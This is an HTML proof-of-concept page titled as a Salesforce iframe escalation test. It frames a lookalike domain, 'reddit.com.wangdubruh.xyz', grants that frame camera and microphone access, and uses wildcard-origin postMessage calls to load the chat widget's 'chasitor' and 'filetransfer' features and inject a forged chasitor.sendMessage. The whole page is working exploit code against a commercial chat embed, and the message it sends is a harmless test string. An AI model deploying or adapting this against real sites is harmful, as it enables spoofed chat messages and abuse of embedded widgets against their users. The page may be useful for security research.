<!DOCTYPE html>
<html>
<head>
  <title>Salesforce iframe escalation test</title>
</head>
<body>
  <h2>PoC: Trigger chasitor.sendMessage</h2>

  <iframe
    id="eswFrame"
    src="https://reddit.com.wangdubruh.xyz"
    style="width:600px;height:400px;border:1px solid black"
    onload="runPoC()"
    allow="camera *; microphone *;"
  ></iframe>

  <script>
    window.addEventListener("message", (e) => {
      console.log("ðŸ“© Message from iframe:", e.data);
    });

    function runPoC() {
      const iframe = document.getElementById("eswFrame").contentWindow;

      console.log("[+] Iframe loaded (Salesforce 4.0)");

      // Load required features
      ["chasitor", "filetransfer"].forEach(feature => {
        console.log(`ðŸ“¤ Sending script.load for feature: '${feature}'`);
        iframe.postMessage({ method: "script.load", feature }, "*");
      });

      // Send fake chasitor.sendMessage
      setTimeout(() => {
        console.log("ðŸ“¤ Sending fake chasitor.sendMessage");
        iframe.postMessage({
          method: "chasitor.sendMessage",
          data: "This is a test message"
        }, "*");
      }, 1000);
    }
  </script>
</body>
</html>
